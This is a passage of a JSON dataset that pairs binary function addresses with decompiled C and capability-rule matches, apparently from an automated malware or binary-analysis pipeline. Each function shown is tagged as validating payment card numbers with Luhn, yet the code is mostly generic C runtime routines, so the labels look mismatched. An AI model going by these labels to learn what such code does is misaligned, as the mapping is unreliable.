            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040321f(int32_t param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040356c();\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 77
    },
    "004032d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004032d3(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    *(in_ECX + 4) = *(arg_8h + 4);\n    (**(**(in_ECX + 4) + 4))();\n    return in_ECX;\n}\n",
        "token_count": 87
    },
    "00403319": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00403319(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00401357(param_1);\n    return;\n}\n",
        "token_count": 55
    },
    "00403382": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403382(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00403b02();\n    return 0x88e0;\n}\n",
        "token_count": 44
    },
    "004033a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004033a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x427300;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    uVar1 = fcn.004020e5(arg_8h, arg_ch, arg_10h);\n    *in_FS_OFFSET = var_18h;\n    return uVar1;\n}\n",
        "token_count": 168
    },
    "0040343b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0040343b(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (arg_8h <= 0x7fffffffU - iVar1) {\n        arg_ch = in_ECX[5];\n        iVar3 = fcn.00405731(iVar1 + arg_8h, arg_ch, 0x7fffffff);\n        iVar4 = fcn.00406122(iVar3 + 1);\n        in_ECX[4] = iVar1 + arg_8h;\n        in_ECX[5] = iVar3;\n        if (arg_ch < 0x10) {\n            fcn.00405830(iVar4, in_ECX, iVar1);\n            *(iVar1 + iVar4) = arg_10h;\n            *(iVar1 + 1 + iVar4) = 0;\n        }\n        else {\n            iVar3 = *in_ECX;\n            fcn.00405830(iVar4, iVar3, iVar1);\n            *(iVar1 + iVar4) = arg_10h;\n            *(iVar1 + 1 + iVar4) = 0;\n            fcn.00401654(iVar3, arg_ch + 1);\n        }\n        *in_ECX = iVar4;\n        return in_ECX;\n    }\n    fcn.0040393b();\n    pcVar2 = swi(3);\n    piVar5 = (*pcVar2)();\n    return piVar5;\n}\n",
        "token_count": 410
    },
    "0040348b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040348b(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t arg_14h_00;\n    int32_t arg_1ch;\n    \n    arg_14h_00 = arg_ch - arg_8h >> 1;\n    arg_1ch = arg_14h - arg_10h >> 1;\n    if (arg_18h == 0) {\n        arg_18h = fcn.00403819();\n    }\n    if (*(arg_18h + 4) == 0) {\n        iVar1 = arg_14h_00;\n        if (arg_1ch <= arg_14h_00) {\n            iVar1 = arg_1ch;\n        }\n        iVar1 = fcn.0040128a(arg_8h, arg_10h, iVar1);\n        if ((iVar1 == 0) && (arg_14h_00 != arg_1ch)) {\n            iVar1 = (arg_1ch <= arg_14h_00) * 2 + -1;\n        }\n    }\n    else {\n        iVar1 = fcn.00403e09(*(arg_18h + 4), 0x1000, arg_8h, arg_14h_00, arg_10h, arg_1ch);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            iVar1 = 0x7fffffff;\n        }\n        else {\n            iVar1 = iVar1 + -2;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 402
    },
    "00403490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t __cdecl fcn.00403490(uint16_t *arg_8h, uint16_t **arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t uVar3;\n    \n    uVar3 = 0;\n    iVar2 = 0;\n    uVar1 = *arg_8h;\n    do {\n        if ((uVar1 != *(L\"IND)\" + iVar2)) && (uVar1 != *(L\"ind)\" + iVar2))) goto code_r0x004b65c0;\n        iVar2 = iVar2 + 2;\n        uVar1 = **arg_ch;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar1;\n    } while (iVar2 != 8);\n    uVar3 = 1;\ncode_r0x004b65c0:\n    return uVar1 & 0xff00 | uVar3;\n}\n",
        "token_count": 210
    },
    "004034f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004034f4(void)\n\n{\n    uint32_t in_EAX;\n    uint *puVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    uint unaff_retaddr;\n    uchar auStack4 [4];\n    \n    puVar2 = in_EAX + (&stack0x00000004 + -in_EAX & 0xf) | -CARRY4(in_EAX, &stack0x00000004 + -in_EAX & 0xf);\n    puVar3 = &stack0x00000000 - puVar2 & ~-(*0x10 < puVar2);\n    for (puVar1 = auStack4 & 0xfffff000; puVar3 < puVar1; puVar1 = puVar1 + -0x400) {\n    }\n    *puVar3 = unaff_retaddr;\n    return;\n}\n",
        "token_count": 193
    },
    "00403503": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403503(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.00406203(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        fcn.00403e04(unaff_EBX & 0xffffff00 | uVar1, param_1 + 0x18);\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 273
    },
    "00403526": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403526(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405574(arg_8h, *arg_10h, arg_ch - arg_8h);\n    if (iVar1 == 0) {\n        iVar1 = arg_ch;\n    }\n    return iVar1;\n}\n",
        "token_count": 96
    },
    "00403553": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00403553(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00402cf7(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "0040356c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040356c(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 39
    },
    "00403576": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403576(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = arg_8h;\n    return;\n}\n",
        "token_count": 47
    },
    "004035e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004035e9(uint *param_1)\n\n{\n    uint var_4h;\n    \n    return *param_1;\n}\n",
        "token_count": 34
    },
    "00403620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403620(int32_t param_1, int32_t *param_2, uint16_t *param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint in_stack_ffffff68;\n    uint32_t uStack148;\n    uchar auStack144 [48];\n    ulong uStack96;\n    uint32_t uStack80;\n    uint32_t uStack20;\n    \n    uStack20 = *0x571ca8 ^ &stack0xfffffff0;\n    uStack148 = *param_3;\n    iVar2 = *param_2;\n    if (iVar2 == 1) {\ncode_r0x004e0229:\n        arg_8h = 8;\ncode_r0x004e022b:\n        iVar2 = fcn.00402f6d(arg_8h, param_2 + 6, uStack148);\n        if (iVar2 == 0) {\n            if (((param_1 == 0x10) || (param_1 == 0x16)) || (param_1 == 0x1d)) {\n                uStack96 = *(param_2 + 4);\n                uStack80 = uStack80 & 0xffffffe3 | 3;\n            }\n            else {\n                uStack80 = uStack80 & 0xfffffffe;\n            }\n            fcn.00404471(auStack144, &uStack148, arg_8h, param_1, param_2 + 2, param_2 + 6);\n        }\n    }\n    else {\n        if (iVar2 == 2) {\n            arg_8h = 4;\n            goto code_r0x004e022b;\n        }\n        if (iVar2 == 3) {\n            arg_8h = 0x11;\n            goto code_r0x004e022b;\n        }\n        if (iVar2 == 4) {\n            arg_8h = 0x12;\n            goto code_r0x004e022b;\n        }\n        if (iVar2 == 5) goto code_r0x004e0229;\n        if (iVar2 == 8) {\n            arg_8h = 0x10;\n            goto code_r0x004e022b;\n        }\n    }\n    fcn.0040524f(uStack148, 0xffff);\n    if (*param_2 != 8) {\n        cVar1 = fcn.00404903();\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.00402fe5(param_2);\n            if (iVar2 != 0) goto code_r0x004e02b8;\n        }\n    }\n    fcn.00403d8c(*param_2);\ncode_r0x004e02b8:\n    fcn.004030bc(in_stack_ffffff68);\n    return;\n}\n",
        "token_count": 632
    },
    "0040366b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040366b(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0x17);\n    if (iVar2 != 0) {\n        pcVar1 = swi(0x29);\n        (*pcVar1)();\n    }\n    fcn.00405a5b(2, 0xc0000417, 1);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000417);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar3);\n    return;\n}\n",
        "token_count": 151
    },
    "00403670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403670(int16_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t **arg_8h_00;\n    int16_t **arg_10h_00;\n    int16_t *arg_10h_01;\n    ushort *arg_8h_01;\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_02;\n    uint uVar5;\n    int16_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.004043ef();\n    arg_8h_00 = iVar3 + 0x50;\n    arg_10h_01 = iVar3 + 0x2a0;\n    *(iVar3 + 0x58) = 0;\n    *arg_10h_01 = 0;\n    arg_10h_00 = iVar3 + 0x54;\n    *arg_8h_00 = arg_8h;\n    *arg_10h_00 = arg_8h + 0x40;\n    piVar6 = arg_8h;\n    if (arg_8h[0x40] != 0) {\n        fcn.004ce540(0x559d88, 0x16, arg_10h_00);\n        piVar6 = *arg_8h_00;\n    }\n    if (*piVar6 == 0) {\n        fcn.004cdcb9(arg_8h_00);\n    }\n    else {\n        if (**arg_10h_00 == 0) {\n            fcn.004cde20(arg_8h_00);\n        }\n        else {\n            fcn.004cdd61(arg_8h_00);\n        }\n        if ((*(iVar3 + 0x58) == 0) && (iVar4 = fcn.004ce540(0x5599d8, 0x40, arg_8h_00),  iVar4 != 0)) {\n            if (**arg_10h_00 == 0) {\n                fcn.004cde20(arg_8h_00);\n            }\n            else {\n                fcn.004cdd61(arg_8h_00);\n            }\n        }\n    }\n    if (*(iVar3 + 0x58) != 0) {\n        if ((*arg_8h == 0) && (arg_8h[0x80] == 0)) {\n            arg_8h_02 = (*_sym.imp.KERNEL32.dll_GetACP)();\n        }\n        else {\n            arg_8h_02 = fcn.004ce356(arg_8h + 0x80, arg_8h_00);\n        }\n        if (((arg_8h_02 != 0) && (arg_8h_02 != 65000)) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h_02 & 0xffff),  iVar4 != 0)) {\n            if (arg_ch != NULL) {\n                *arg_ch = arg_8h_02;\n            }\n            if (arg_10h == 0) {\n                return 1;\n            }\n            arg_8h_01 = arg_10h + 0x120;\n            *arg_8h_01 = 0;\n            piVar6 = arg_10h_01;\n            do {\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            iVar3 = fcn.00405b64(arg_8h_01, 0x55, arg_10h_01, (piVar6 - (iVar3 + 0x2a2) >> 1) + 1);\n            if (iVar3 != 0) {\ncode_r0x004ce7b6:\n                fcn.0040366b(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                uVar5 = (*pcVar2)();\n                return uVar5;\n            }\n            iVar3 = fcn.00404809(arg_8h_01, 0x1001, arg_10h, 0x40);\n            if (iVar3 != 0) {\n                iVar3 = arg_10h + 0x80;\n                iVar4 = fcn.00404809(arg_10h + 0x120, 0x1002, iVar3, 0x40);\n                if ((iVar4 != 0) &&\n                   (((iVar4 = fcn.004050f6(iVar3, 0x5f),  iVar4 == 0 && (iVar4 = fcn.004050f6(iVar3, 0x2e),  iVar4 == 0)\n                     ) || (iVar3 = fcn.00404809(arg_10h + 0x120, 7, iVar3, 0x40),  iVar3 != 0)))) {\n                    if (arg_8h_02 != 0xfde9) {\n                        fcn.00404534(arg_8h_02, arg_10h + 0x100, 0x10, 10);\n                        return 1;\n                    }\n                    iVar3 = fcn.00405b64(arg_10h + 0x100, 0x10, L\"utf8\", 5);\n                    if (iVar3 == 0) {\n                        return 1;\n                    }\n                    goto code_r0x004ce7b6;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1270
    },
    "00403675": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403675(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.0040593e(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00403cd3(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004036cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004036cf(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.0040592a(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 190
    },
    "004036f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004036f2(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0) {\n        if (iVar1 < 8) {\n            fcn.00402090(iVar1 * 0x18 + 0x574128);\n        }\n        return;\n    }\n    fcn.00401ce9(4);\n    return;\n}\n",
        "token_count": 101
    },
    "0040370b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040370b(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = arg_8h;\n    if (*arg_8h != 0) {\n        do {\n            if (*arg_ch != 0) {\n                piVar3 = arg_ch;\n                iVar1 = *arg_ch;\n                do {\n                    if (*piVar2 == iVar1) goto code_r0x004cd675;\n                    piVar3 = piVar3 + 1;\n                    iVar1 = *piVar3;\n                } while (iVar1 != 0);\n            }\n            piVar2 = piVar2 + 1;\n        } while (*piVar2 != 0);\n    }\ncode_r0x004cd675:\n    return piVar2 - arg_8h >> 1;\n}\n",
        "token_count": 224
    },
    "00403742": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403742(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.004056a0(&var_4h, 0x1f);\n    fcn.004d82e1(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 68
    },
    "00403765": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403765(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.004ca267(0x1d, \"AppPolicyGetThreadInitializationType\", 0x559904, \"AppPolicyGetThreadInitializationType\"\n                         );\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x578000)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 134
    },
    "0040378d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040378d(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0040213f(arg_8h, arg_8h + 0x1c, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 86
    },
    "004037b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004037b0(void)\n\n{\n    int32_t arg_8h;\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsW)();\n    if (arg_8h == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.004c8e67(arg_8h);\n        arg_8h_00 = iVar1 - arg_8h & 0xfffffffe;\n        iVar1 = fcn.0040409d(arg_8h_00);\n        if (iVar1 != 0) {\n            fcn.00405830(iVar1, arg_8h, arg_8h_00);\n        }\n        fcn.0040640b(0);\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 214
    },
    "004037ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004037ce(void)\n\n{\n    fcn.004060cd(0, 0, 0, 0, 0);\n    return;\n}\n",
        "token_count": 37
    },
    "004037e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004037e2(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    \n    if (arg_8h < 0x80000000) {\n        fcn.00406122(arg_8h * 2);\n        return;\n    }\n    fcn.00405169();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 92
    },
    "00403814": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403814(uint arg_8h)\n\n{\n    uchar *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = 0;\n    *(in_ECX + 4) = arg_8h;\n    return;\n}\n",
        "token_count": 60
    },
    "00403819": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403819(void)\n\n{\n    int32_t arg_8h;\n    int32_t var_4h;\n    \n    arg_8h = fcn.004043ef();\n    var_4h = *(arg_8h + 0x4c);\n    fcn.0040449e(arg_8h, &var_4h);\n    return var_4h + 0xa0;\n}\n",
        "token_count": 95
    },
    "0040382d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040382d(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004ca267(5, \"FlsGetValue\", 0x559604, 0x55960c);\n    if (pcVar1 != NULL) {\n        (**0x578000)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004ca734. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsGetValue)();\n    return;\n}\n",
        "token_count": 141
    },
    "00403850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_310h\n\nvoid __cdecl fcn.00403850(int32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint *puVar1;\n    uint arg_8h_00;\n    uint var_310h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = arg_14h;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((arg_14h == 0) || (arg_8h == 0)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        arg_8h_00 = fcn.00401799(arg_8h, &arg_ch, &var_310h);\n        fcn.00405b5f(arg_8h_00, &var_310h, arg_10h_00);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    fcn.004030bc(var_310h);\n    return;\n}\n",
        "token_count": 288
    },
    "00403869": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403869(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.00406203(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 203
    },
    "0040388c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040388c(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint32_t arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < 0x7fffffff) {\n        arg_ch = in_ECX[5];\n        iVar2 = fcn.00401e29(arg_8h, arg_ch, 0x7ffffffe);\n        arg_8h_00 = fcn.004037e2(iVar2 + 1);\n        in_ECX[4] = arg_8h;\n        in_ECX[5] = iVar2;\n        fcn.00404ce1(arg_8h_00, arg_10h, arg_8h);\n        *(arg_8h_00 + arg_8h * 2) = 0;\n        if (7 < arg_ch) {\n            fcn.00401654(*in_ECX, arg_ch * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.0040393b();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 310
    },
    "0040389b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040389b(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar1 = arg_8h[4];\n    if (7 < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    if (uVar1 < 8) {\n        *in_ECX = *arg_8h;\n        in_ECX[1] = arg_8h[1];\n        in_ECX[2] = arg_8h[2];\n        in_ECX[3] = arg_8h[3];\n        uVar3 = 7;\n    }\n    else {\n        uVar3 = 0x7ffffffe;\n        if ((uVar1 | 7) < 0x7fffffff) {\n            uVar3 = uVar1 | 7;\n        }\n        uVar2 = fcn.004037e2(uVar3 + 1);\n        *in_ECX = uVar2;\n        fcn.00405830(uVar2, arg_8h, uVar1 * 2 + 2);\n    }\n    in_ECX[4] = uVar1;\n    in_ECX[5] = uVar3;\n    return;\n}\n",
        "token_count": 305
    },
    "004038f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004038f0(uint *arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = *arg_8h;\n    *arg_8h = 0;\n    return uVar1;\n}\n",
        "token_count": 65
    },
    "00403904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00403904(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040687a(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "00403918": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.00403918(uint arg_8h)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02(&stack0x00000028, 0xa9b);\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 102
    },
    "00403922": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403922(uint param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401929();\n    fcn.0040321f();\n    return param_1;\n}\n",
        "token_count": 55
    },
    "00403954": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
